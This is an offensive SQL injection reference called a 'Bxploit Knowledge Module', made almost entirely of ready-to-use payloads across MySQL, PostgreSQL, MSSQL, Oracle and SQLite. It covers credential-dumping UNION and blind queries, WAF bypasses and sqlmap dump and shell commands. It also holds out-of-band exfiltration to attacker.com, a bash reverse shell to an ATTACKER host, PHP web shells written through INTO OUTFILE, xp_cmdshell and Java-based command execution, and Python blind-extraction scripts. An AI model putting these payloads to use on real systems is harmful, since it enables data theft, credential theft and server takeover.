# SQL Injection Complete Arsenal

> Bxploit (bx) Knowledge Module — SQLi from first probe to full extraction across all major RDBMS.

This module covers every practical SQLi class, DBMS-specific payloads, WAF bypass techniques, sqlmap advanced usage, and manual exploitation chains. All payloads are tested patterns — adapt parameter names, column counts, and table names to the target.

---

## 1. Detection & Fingerprinting

### 1.1 Quick Detection Probes

```
# Basic error triggers
'
''
`
")
'))
%27
%22

# Arithmetic truth tests
1 AND 1=1
1 AND 1=2
1 OR 1=1
1' AND '1'='1
1' AND '1'='2

# Comment-based detection
1'--
1'#
1'/*

# Time-based detection (universal)
1' AND SLEEP(5)--            # MySQL
1'; WAITFOR DELAY '0:0:5'--  # MSSQL
1' AND pg_sleep(5)--         # PostgreSQL
1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--  # Oracle
```

### 1.2 DBMS Fingerprinting

```sql
-- Version extraction per DBMS
' UNION SELECT @@version--                          # MySQL / MSSQL
' UNION SELECT version()--                          # PostgreSQL
' UNION SELECT banner FROM v$version WHERE ROWNUM=1-- # Oracle
' UNION SELECT sqlite_version()--                   # SQLite

-- Behavioral fingerprinting (no output needed)
' AND 'foo' 'bar'='foobar'--         # MySQL (string concat without operator)
' AND 'foo'||'bar'='foobar'--        # PostgreSQL / Oracle / SQLite
' AND 'foo'+'bar'='foobar'--         # MSSQL

-- Error message fingerprinting
' AND EXTRACTVALUE(1,1)--            # MySQL (XPATH error)
' AND 1=CONVERT(int,'a')--          # MSSQL
' AND 1=CAST('a' AS int)--          # PostgreSQL
' AND UTL_INADDR.GET_HOST_ADDRESS('x')-- # Oracle
```

---

## 2. Error-Based Injection

### 2.1 MySQL Error-Based

```sql
-- EXTRACTVALUE (MySQL 5.1+)
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e))--

-- UPDATEXML (MySQL 5.1+)
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)--

-- Double query / subquery error
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- BIGINT overflow (MySQL 5.5.5+)
' AND !(SELECT*FROM(SELECT CONCAT(version()))x)-~0--

-- EXP overflow (MySQL 5.5.5+)
' AND EXP(~(SELECT*FROM(SELECT version())x))--

-- Geometry functions (MySQL 5.7+)
' AND ST_LatFromGeoHash((SELECT version()))--
' AND ST_LongFromGeoHash((SELECT version()))--
' AND ST_PointFromGeoHash((SELECT version()),1)--

-- JSON functions (MySQL 5.7+)
' AND JSON_KEYS((SELECT CONCAT(0x7b,CONCAT(0x22,(SELECT version()),0x22,0x3a,0x22,0x22),0x7d)))--
```

### 2.2 PostgreSQL Error-Based

```sql
-- CAST error
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--

-- XMLparse error
' AND 1=2 OR 1=1/(SELECT 0 FROM(SELECT CAST(version() AS NUMERIC))x)--

-- lo_import
' AND 1=2 UNION SELECT lo_import('/etc/passwd')--
```

### 2.3 MSSQL Error-Based

```sql
-- CONVERT / CAST
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=CAST((SELECT @@version) AS int)--

-- Stacked + error
'; SELECT 1/0 WHERE 1=1 AND (SELECT TOP 1 name FROM sysobjects WHERE xtype='U')>0--

-- FOR XML PATH exfil
' AND 1=CONVERT(int,(SELECT name FROM sysobjects WHERE xtype='U' FOR XML PATH('')))--
```

### 2.4 Oracle Error-Based

```sql
-- CTXSYS.DRITHSX.SN
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--

-- UTL_INADDR
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--

-- DBMS_UTILITY.SQLID_TO_SQLHASH
' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT banner FROM v$version WHERE ROWNUM=1))--

-- XMLType
' AND (SELECT XMLType('<:'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'>') FROM dual) IS NOT NULL--
```

---

## 3. UNION-Based Injection

### 3.1 Column Count Enumeration

```sql
-- ORDER BY method (binary search)
' ORDER BY 1--
' ORDER BY 5--
' ORDER BY 10--
' ORDER BY 7--    # narrow down

-- NULL method
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
# ... increment until no error

-- GROUP BY / HAVING
' GROUP BY 1--
' GROUP BY 1,2--
' GROUP BY 1,2,3--
```

### 3.2 Data Type Detection

```sql
-- Find string-compatible columns
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

### 3.3 Full UNION Extraction Chains

```sql
-- MySQL full chain
' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata--
' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='target_db'--
' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users--

-- PostgreSQL full chain
' UNION SELECT 1,string_agg(schemaname,','),3 FROM pg_tables--
' UNION SELECT 1,string_agg(tablename,','),3 FROM pg_tables WHERE schemaname='public'--
' UNION SELECT 1,string_agg(column_name,','),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,string_agg(username||':'||password,','),3 FROM users--

-- MSSQL full chain
' UNION SELECT 1,name,3 FROM master..sysdatabases--
' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--
' UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--
' UNION SELECT 1,username+':'+password,3 FROM users--

-- Oracle full chain
' UNION SELECT NULL,owner,NULL FROM all_tables--
' UNION SELECT NULL,table_name,NULL FROM all_tables WHERE owner='SCHEMA'--
' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT NULL,USERNAME||':'||PASSWORD,NULL FROM USERS--

-- SQLite full chain
' UNION SELECT 1,GROUP_CONCAT(name),3 FROM sqlite_master WHERE type='table'--
' UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='users'--
' UNION SELECT 1,GROUP_CONCAT(username||':'||password),3 FROM users--
```

---

## 4. Boolean Blind Injection

### 4.1 Core Boolean Payloads

```sql
-- Character extraction (MySQL)
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>77--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--
# binary search: 77 -> 100 -> 89 -> ...

-- Bit-by-bit extraction (all DBMS, faster binary search)
' AND (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) & 128)=128--
' AND (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) & 64)=64--
' AND (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) & 32)=32--
# ... through & 1

-- PostgreSQL
' AND (SELECT SUBSTRING(usename,1,1) FROM pg_user LIMIT 1)='p'--

-- MSSQL
' AND SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1)='u'--

-- Oracle
' AND SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1)='O'--

-- SQLite
' AND SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1),1,1)='u'--
```

### 4.2 Data Length Enumeration

```sql
' AND (SELECT LENGTH(password) FROM users LIMIT 1)=32--           # MySQL/SQLite
' AND (SELECT LENGTH(password) FROM users LIMIT 1 OFFSET 0)=32--  # PostgreSQL
' AND LEN((SELECT TOP 1 password FROM users))=32--                 # MSSQL
' AND LENGTH((SELECT password FROM users WHERE ROWNUM=1))=32--     # Oracle
```

### 4.3 Row Count Enumeration

```sql
' AND (SELECT COUNT(*) FROM users)>0--
' AND (SELECT COUNT(*) FROM users)>10--
' AND (SELECT COUNT(*) FROM users)=15--
```

---

## 5. Time-Based Blind Injection

### 5.1 Conditional Time Delays

```sql
-- MySQL
' AND IF(1=1,SLEEP(5),0)--
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>77,SLEEP(5),0)--
' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--
' AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--

-- MySQL benchmark alternative (when SLEEP is blocked)
' AND IF(1=1,BENCHMARK(5000000,SHA1('test')),0)--

-- PostgreSQL
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
' AND (SELECT CASE WHEN (SUBSTRING(version(),1,1)='P') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--
'; IF (ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>77) WAITFOR DELAY '0:0:5'--

-- Oracle
' AND 1=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END)--
' AND 1=(CASE WHEN (SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1)='O') THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END)--

-- SQLite
' AND CASE WHEN (1=1) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) ELSE 0 END--
```

### 5.2 Heavy Query Fallback (when delay functions are blocked)

```sql
-- MySQL
' AND (SELECT COUNT(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C)>0 AND 1=1--

-- PostgreSQL
' AND (SELECT COUNT(*) FROM generate_series(1,5000000))>0--

-- MSSQL
' AND (SELECT COUNT(*) FROM spt_values A CROSS JOIN spt_values B)>0--

-- Oracle
' AND (SELECT COUNT(*) FROM all_objects A,all_objects B)>0--
```

---

## 6. Second-Order SQL Injection

Second-order SQLi occurs when user input is stored, then later used unsafely in a different query.

### 6.1 Classic Scenarios

```
# Registration payload — injected into username field
admin'--
admin'/*
' UNION SELECT 1,2,3--

# The payload triggers when:
# - Password reset queries: SELECT * FROM users WHERE username='admin'--'
# - Profile display queries that reflect the stored username
# - Admin panels that query user-submitted data
# - Log viewers that interpolate stored values
```

### 6.2 Exploitation Pattern

```
Step 1: Register user with name:  admin' AND 1=CONVERT(int,@@version)--
Step 2: Login normally with the new account
Step 3: Trigger a feature that queries the stored username
        (profile page, password change, admin user list, export)
Step 4: Observe error message containing @@version output
```

### 6.3 Detection Approach

```
1. Map all input fields → identify where data is stored
2. Map all output/processing points → identify where stored data is reused in queries
3. Register test accounts with SQLi payloads as field values
4. Trigger each processing/output point and monitor for:
   - SQL errors
   - Behavioral anomalies (extra rows returned, auth bypass)
   - Time delays (if time-based payloads used)
```

---

## 7. Out-of-Band (OOB) Injection

For completely blind scenarios where no in-band or time-based feedback is available.

### 7.1 DNS Exfiltration

```sql
-- MySQL (requires FILE privilege + Windows OR custom UDF)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))--
' UNION SELECT LOAD_FILE(CONCAT('\\\\',
  (SELECT HEX(password) FROM users LIMIT 1),'.attacker.com\\a'))--

-- MSSQL (xp_dirtree — very reliable on Windows)
'; EXEC master..xp_dirtree '\\'+@@version+'.attacker.com\a'--
'; DECLARE @d varchar(1024); SET @d=(SELECT TOP 1 password FROM users);
  EXEC('master..xp_dirtree "\\'+@d+'.attacker.com\a"')--

-- MSSQL (xp_fileexist alternative)
'; EXEC xp_fileexist '\\'+@@version+'.attacker.com\a'--

-- Oracle (UTL_HTTP)
' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1))--

-- Oracle (UTL_INADDR — DNS)
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1)||'.attacker.com')--

-- Oracle (DBMS_LDAP — LDAP exfil)
' AND 1=2 OR 1=DBMS_LDAP.INIT((SELECT banner FROM v$version WHERE ROWNUM=1)||'.attacker.com',80)--

-- Oracle (HTTPURITYPE)
' AND (SELECT HTTPURITYPE('http://attacker.com/'||(SELECT user FROM dual)).GETCLOB() FROM dual) IS NOT NULL--

-- PostgreSQL (COPY ... TO PROGRAM — superuser)
'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?d='||version()--

-- PostgreSQL (dblink — requires extension)
'; SELECT dblink_connect('host=attacker.com dbname='||(SELECT version()))--
```

### 7.2 HTTP Exfiltration

```sql
-- MSSQL (OLE Automation)
'; DECLARE @o int; EXEC sp_OACreate 'MSXML2.XMLHTTP',@o OUT;
  EXEC sp_OAMethod @o,'open',NULL,'GET','http://attacker.com/'+(SELECT @@version),false;
  EXEC sp_OAMethod @o,'send'--

-- Oracle (UTL_HTTP full request)
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/?data='||(SELECT user FROM dual)) FROM dual--
```

### 7.3 Attacker Listener Setup

```bash
# DNS listener (Burp Collaborator alternative)
sudo python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(('0.0.0.0', 53))
while True:
    data, addr = s.recvfrom(512)
    print(f'DNS query from {addr}: {data}')
"

# HTTP listener
python3 -m http.server 8080
# or
nc -lvnp 8080

# Interactsh (purpose-built OOB tool)
interactsh-client -v
```

---

## 8. WAF Bypass Techniques

### 8.1 Encoding & Case Manipulation

```sql
-- URL encoding
%27%20UNION%20SELECT%201,2,3--
%27%20OR%201%3D1--

-- Double URL encoding
%2527%2520UNION%2520SELECT%25201%252C2%252C3--

-- Unicode / overlong UTF-8
%u0027 OR 1=1--
%C0%A7 OR 1=1--    # overlong encoding of '

-- Mixed case
' uNiOn SeLeCt 1,2,3--
' UnIoN aLl SeLeCt 1,2,3--

-- Hex encoding (MySQL)
' UNION SELECT 0x61646d696e,2,3--   # 'admin' in hex
```

### 8.2 Comment-Based Bypass

```sql
-- Inline comments (MySQL specific)
' /*!UNION*/ /*!SELECT*/ 1,2,3--
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--

-- Comment splitting
' UN/**/ION SEL/**/ECT 1,2,3--
' UNION/**/ALL/**/SELECT/**/1,2,3--

-- Comment-delimited keywords
'/**/UNION/**/SELECT/**/1,2,3--
```

### 8.3 Whitespace Alternatives

```sql
-- Tab, newline, carriage return
' UNION%09SELECT%091,2,3--
' UNION%0ASELECT%0A1,2,3--
' UNION%0DSELECT%0D1,2,3--
' UNION%0D%0ASELECT%0D%0A1,2,3--

-- Parentheses as separators
' UNION(SELECT(1),(2),(3))--
'UNION(SELECT(password)FROM(users))--

-- Backtick (MySQL)
`UNION` `SELECT` 1,2,3--

-- Plus sign (MSSQL)
' UNION+SELECT+1,2,3--
```

### 8.4 Function & Keyword Substitution

```sql
-- Alternatives to UNION SELECT
' UNION ALL SELECT 1,2,3--
' UNION DISTINCT SELECT 1,2,3--

-- Alternatives to AND/OR
' && 1=1--
' || 1=1--
' %26%26 1=1--
' %7C%7C 1=1--
' XOR 1=1--
' DIV 0--

-- Alternatives to quotes
' UNION SELECT CHAR(97,100,109,105,110)--     # MySQL/MSSQL
' UNION SELECT CHR(97)||CHR(100)||CHR(109)--  # Oracle/PostgreSQL
' UNION SELECT x'61646d696e'--                 # SQLite hex string

-- Alternatives to SLEEP/WAITFOR (already covered above)
-- Alternatives to spaces (already covered above)

-- Substring alternatives
MID(str,1,1)           # MySQL
SUBSTR(str,1,1)        # Oracle/PostgreSQL/SQLite
LEFT(str,1)            # MySQL/MSSQL
RIGHT(str,1)           # MySQL/MSSQL
LPAD(str,1)            # MySQL/Oracle
```

### 8.5 HTTP Parameter Pollution (HPP)

```
# Send same parameter multiple times — WAF may check first, app may use last
GET /page?id=1&id=' UNION SELECT 1,2,3--

# Parameter fragmentation
GET /page?id=1 UNION/*&id=*/SELECT 1,2,3--
```

### 8.6 JSON / XML Body Injection

```json
// JSON body — many WAFs don't inspect JSON deeply
{"username": "admin' OR 1=1--", "password": "x"}
{"query": {"$where": "1==1"}}
```

```xml
<!-- XML body (SOAP, API) -->
<username>admin' OR 1=1--</username>
<search><![CDATA[' UNION SELECT 1,2,3--]]></search>
```

### 8.7 Chunked Transfer Encoding Bypass

```
# Split payload across HTTP chunks — some WAFs reassemble incorrectly
Transfer-Encoding: chunked

3
id=
4
1 UN
5
ION S
7
ELECT
1
1
0
```

### 8.8 Multipart/Form-Data Bypass

```
# Switch Content-Type to multipart — WAF may not parse it
Content-Type: multipart/form-data; boundary=----x
------x
Content-Disposition: form-data; name="id"

1' UNION SELECT 1,2,3--
------x--
```

---

## 9. sqlmap Advanced Usage

### 9.1 Basic Discovery

```bash
# GET parameter
sqlmap -u "http://target.com/page?id=1" --batch --random-agent

# POST parameter
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch

# With cookie / session
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123" --batch

# From Burp request file
sqlmap -r request.txt --batch

# Specific parameter
sqlmap -u "http://target.com/page?id=1&name=foo" -p id --batch

# Headers injection
sqlmap -u "http://target.com/" --headers="X-Forwarded-For: 1*\nReferer: 1*" --batch
```

### 9.2 Enumeration

```bash
# Full enumeration chain
sqlmap -r req.txt --dbs --batch
sqlmap -r req.txt -D target_db --tables --batch
sqlmap -r req.txt -D target_db -T users --columns --batch
sqlmap -r req.txt -D target_db -T users -C username,password --dump --batch

# Current user/db/hostname
sqlmap -r req.txt --current-user --current-db --hostname --batch

# Check DBA privileges
sqlmap -r req.txt --is-dba --batch

# Dump all
sqlmap -r req.txt --dump-all --batch

# Passwords (auto-crack)
sqlmap -r req.txt -D target_db -T users -C password --dump --batch --passwords
```

### 9.3 Advanced Techniques

```bash
# Force specific technique
# B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline
sqlmap -r req.txt --technique=BEUST --batch

# Increase level and risk (max: level=5, risk=3)
sqlmap -r req.txt --level=5 --risk=3 --batch

# Custom injection point (use * marker)
sqlmap -u "http://target.com/page/1*/info" --batch
sqlmap -r req.txt --headers="X-Custom: 1*" --batch

# Second-order injection
sqlmap -r req.txt --second-url="http://target.com/profile" --batch

# Tamper scripts (WAF bypass)
sqlmap -r req.txt --tamper=space2comment,between,randomcase --batch
sqlmap -r req.txt --tamper=charencode,chardoubleencode --batch
sqlmap -r req.txt --tamper=equaltolike,greatest --batch
sqlmap -r req.txt --tamper=apostrophemask,percentage --batch

# Multiple tampers chained
sqlmap -r req.txt --tamper=space2comment,randomcase,between,charencode --batch

# Force DBMS
sqlmap -r req.txt --dbms=mysql --batch
sqlmap -r req.txt --dbms=postgresql --batch

# Specify union columns
sqlmap -r req.txt --union-cols=5 --batch
sqlmap -r req.txt --union-char=NULL --batch

# Time-based tuning
sqlmap -r req.txt --time-sec=10 --batch   # increase delay threshold

# Threads (faster blind extraction)
sqlmap -r req.txt --threads=10 --batch
```

### 9.4 OS Interaction

```bash
# Read file from server
sqlmap -r req.txt --file-read="/etc/passwd" --batch

# Write file to server
sqlmap -r req.txt --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch

# OS shell (MySQL UDF / MSSQL xp_cmdshell / PostgreSQL COPY TO PROGRAM)
sqlmap -r req.txt --os-shell --batch

# OS command
sqlmap -r req.txt --os-cmd="id" --batch

# SQL shell
sqlmap -r req.txt --sql-shell --batch

# Metasploit integration (Meterpreter via SQLi)
sqlmap -r req.txt --os-pwn --batch
```

### 9.5 Evasion & Stealth

```bash
# Proxy through Burp/Tor
sqlmap -r req.txt --proxy="http://127.0.0.1:8080" --batch
sqlmap -r req.txt --tor --tor-type=SOCKS5 --batch

# Random agent + delay
sqlmap -r req.txt --random-agent --delay=2 --batch

# Prefix/suffix
sqlmap -r req.txt --prefix="')" --suffix="AND ('1'='1" --batch

# Custom User-Agent
sqlmap -r req.txt --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/128.0" --batch

# Skip URL encoding (sometimes needed)
sqlmap -r req.txt --skip-urlencode --batch

# Null connection (speed up boolean blind)
sqlmap -r req.txt --null-connection --batch

# Identify WAF
sqlmap -r req.txt --identify-waf --batch

# Crawl + auto-test
sqlmap -u "http://target.com/" --crawl=3 --batch
```

### 9.6 Key Tamper Scripts Reference

| Tamper Script | Description |
|---|---|
| `apostrophemask` | Replace `'` with UTF-8 full-width equivalent |
| `apostrophenullencode` | Replace `'` with `%00%27` |
| `base64encode` | Base64 encode payload |
| `between` | Replace `>` with `NOT BETWEEN 0 AND` |
| `charencode` | URL-encode all characters |
| `chardoubleencode` | Double URL-encode |
| `commalesslimit` | Replace `LIMIT N,M` with `LIMIT M OFFSET N` |
| `equaltolike` | Replace `=` with `LIKE` |
| `greatest` | Replace `>` with `GREATEST` |
| `halfversionedmorekeywords` | MySQL versioned comment around keywords |
| `modsecurityversioned` | Versioned comment for ModSecurity bypass |
| `modsecurityzeroversioned` | Zero-versioned comment for ModSecurity |
| `multiplespaces` | Add random spaces around keywords |
| `percentage` | Insert `%` before each character |
| `randomcase` | Randomize keyword casing |
| `randomcomments` | Insert random inline comments into keywords |
| `space2comment` | Replace spaces with `/**/` |
| `space2dash` | Replace spaces with `--\n` |
| `space2hash` | Replace spaces with `#\n` (MySQL) |
| `space2mssqlblank` | Replace spaces with random MSSQL whitespace |
| `space2mysqldash` | Replace spaces with `-- ` |
| `space2plus` | Replace spaces with `+` |
| `space2randomblank` | Replace spaces with random whitespace |
| `symboliclogical` | Replace `AND`/`OR` with `&&`/`||` |
| `unionalltounion` | Replace `UNION ALL SELECT` with `UNION SELECT` |
| `unmagicquotes` | Replace `'` with multibyte `%bf%27` (GBK bypass for addslashes) |
| `versionedkeywords` | MySQL versioned comments around each keyword |
| `versionedmorekeywords` | More aggressive versioned comments |

---

## 10. File Read / Write & RCE via SQLi

### 10.1 MySQL File Operations

```sql
-- Read files (requires FILE privilege)
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--
' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3--
' UNION SELECT 1,LOAD_FILE(0x2F6574632F706173737764),3--  # hex path

-- Write files (requires FILE privilege + writable directory)
' UNION SELECT 1,'<?php system($_GET["cmd"]);?>',3 INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT 1,0x3C3F7068702073797374656D28245F4745545B22636D64225D293B3F3E,3 INTO OUTFILE '/var/www/html/cmd.php'--

-- DUMPFILE (binary safe, single row)
' UNION SELECT 1,0x3C3F7068702073797374656D28245F4745545B22636D64225D293B3F3E,3 INTO DUMPFILE '/var/www/html/shell.php'--

-- User Defined Function (UDF) for RCE
-- Compile lib_mysqludf_sys, write to plugin dir, then:
CREATE FUNCTION sys_exec RETURNS STRING SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');
```

### 10.2 PostgreSQL File & RCE

```sql
-- Read files
' UNION SELECT 1,pg_read_file('/etc/passwd',0,10000),3--

-- Write files (large object method)
SELECT lo_from_bytea(0, decode('PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=','base64'));
SELECT lo_export(LAST_OID, '/var/www/html/shell.php');

-- COPY TO for RCE (superuser only)
COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned';
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"';

-- CREATE LANGUAGE for RCE
CREATE OR REPLACE FUNCTION cmd(text) RETURNS text AS $$
  import os; return os.popen(args[0]).read()
$$ LANGUAGE plpython3u;
SELECT cmd('id');
```

### 10.3 MSSQL File & RCE

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'type C:\inetpub\wwwroot\web.config';
EXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';

-- Read files via OPENROWSET
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x;

-- Write files
EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]);?^> > C:\inetpub\wwwroot\shell.php';

-- NTLM hash capture (relay to Responder)
EXEC master..xp_dirtree '\\ATTACKER_IP\share';
EXEC xp_fileexist '\\ATTACKER_IP\share\file';
```

### 10.4 Oracle File & RCE

```sql
-- Read files via UTL_FILE
DECLARE f UTL_FILE.FILE_TYPE;
  buf VARCHAR2(32767);
BEGIN
  f := UTL_FILE.FOPEN('DIRECTORY_NAME','/etc/passwd','r');
  UTL_FILE.GET_LINE(f,buf);
  UTL_FILE.FCLOSE(f);
END;

-- Java-based RCE (if CREATE JAVA granted)
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "cmd" AS
  import java.io.*; import java.util.*;
  public class cmd {
    public static String exec(String c) throws Exception {
      Process p = Runtime.getRuntime().exec(c);
      BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
      String l,o=""; while((l=br.readLine())!=null) o+=l+"\n"; return o;
    }
  };
/
CREATE OR REPLACE FUNCTION oscmd(c IN VARCHAR2) RETURN VARCHAR2
  AS LANGUAGE JAVA NAME 'cmd.exec(java.lang.String) return java.lang.String';
/
SELECT oscmd('id') FROM dual;

-- DBMS_SCHEDULER RCE
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name=>'PWNED', job_type=>'EXECUTABLE',
    job_action=>'/bin/bash', number_of_arguments=>2,
    auto_drop=>TRUE, enabled=>FALSE);
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('PWNED',1,'-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('PWNED',2,'id > /tmp/pwn');
  DBMS_SCHEDULER.ENABLE('PWNED');
END;
/
```

---

## 11. Authentication Bypass Payloads

```sql
-- Login form bypass (username field)
admin'--
admin'#
admin'/*
' OR 1=1--
' OR 1=1#
' OR '1'='1'--
'='
'OR''='
') OR ('1'='1'--
') OR ('1'='1'/*
admin' AND 1=1--

-- Login form bypass (password field)
' OR 1=1--
' OR '1'='1
anything' OR 'x'='x

-- With specific admin target
' OR username='admin'--
' UNION SELECT 1,'admin','password_hash' FROM users WHERE '1'='1
```

---

## 12. Privilege Escalation via SQLi

### 12.1 MySQL

```sql
-- Check privileges
SELECT * FROM mysql.user WHERE user=CURRENT_USER();
SELECT grantee,privilege_type FROM information_schema.user_privileges;

-- Read MySQL credentials
SELECT user,authentication_string FROM mysql.user;

-- Grant file privilege (if you have GRANT)
GRANT FILE ON *.* TO 'current_user'@'%';
```

### 12.2 MSSQL

```sql
-- Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Impersonate higher-priv user
EXECUTE AS LOGIN='sa'; EXEC xp_cmdshell 'whoami';

-- Linked server exploitation
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT @@version');
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];

-- Find linked servers
SELECT * FROM sys.servers;
EXEC sp_linkedservers;
```

### 12.3 PostgreSQL

```sql
-- Check superuser
SELECT current_setting('is_superuser');
SELECT rolsuper FROM pg_roles WHERE rolname=current_user;

-- Read pg_shadow (password hashes)
SELECT usename,passwd FROM pg_shadow;

-- ALTER ROLE escalation (if you can)
ALTER ROLE current_user SUPERUSER;
```

---

## 13. Automation Scripts

### 13.1 Python Boolean Blind Extractor

```python
#!/usr/bin/env python3
"""Boolean-blind SQLi data extractor."""
import requests
import string

URL = "http://target.com/page"
CHARSET = string.printable
TRUE_MARKER = "Welcome"  # string present in TRUE response

def extract(query, max_len=64):
    result = ""
    for i in range(1, max_len + 1):
        found = False
        for c in CHARSET:
            payload = f"' AND SUBSTRING(({query}),{i},1)='{c}'-- "
            r = requests.get(URL, params={"id": payload})
            if TRUE_MARKER in r.text:
                result += c
                print(f"\r[+] Extracted: {result}", end="", flush=True)
                found = True
                break
        if not found:
            break
    print()
    return result

# Usage
db = extract("SELECT database()")
print(f"[*] Database: {db}")
tables = extract(f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db}'")
print(f"[*] Tables: {tables}")
```

### 13.2 Python Time-Blind Extractor

```python
#!/usr/bin/env python3
"""Time-blind SQLi data extractor with binary search."""
import requests
import time

URL = "http://target.com/page"
DELAY = 3
THRESHOLD = DELAY - 0.5

def check(payload):
    start = time.time()
    requests.get(URL, params={"id": payload})
    elapsed = time.time() - start
    return elapsed >= THRESHOLD

def extract_char(query, pos):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        payload = f"' AND IF(ASCII(SUBSTRING(({query}),{pos},1))>{mid},SLEEP({DELAY}),0)-- "
        if check(payload):
            low = mid + 1
        else:
            high = mid
    return chr(low) if low > 32 else None

def extract(query, max_len=64):
    result = ""
    for i in range(1, max_len + 1):
        c = extract_char(query, i)
        if c is None:
            break
        result += c
        print(f"\r[+] {result}", end="", flush=True)
    print()
    return result

db = extract("SELECT database()")
